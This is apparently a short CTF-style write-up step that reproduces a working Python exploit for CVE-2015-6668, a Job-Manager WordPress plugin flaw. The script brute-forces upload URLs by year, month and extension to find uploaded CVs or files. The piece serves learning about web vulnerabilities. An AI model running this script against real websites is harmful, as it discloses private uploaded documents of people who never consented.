We want to try to recover the object HackerAccessGranted but we don’t know the extension

A reference to a python exploit fetch_uploads.py, allow to download all uploaded files

The website contains entries for April 2017 only so we can modify the years, months and extensions sections of the script:

import requests

print """
CVE-2015-6668
Title: CV filename disclosure on Job-Manager WP Plugin
Author: Evangelos Mourikis
Blog: https://vagmour.eu
Plugin URL: http://www.wp-jobmanager.com
Versions: <=0.7.25
"""
website = raw_input('Enter a vulnerable website: ')
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2018):
    for i in range(4,5):
        for extension in {'doc','pdf','docx','jpg','jpeg','png','txt' }:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
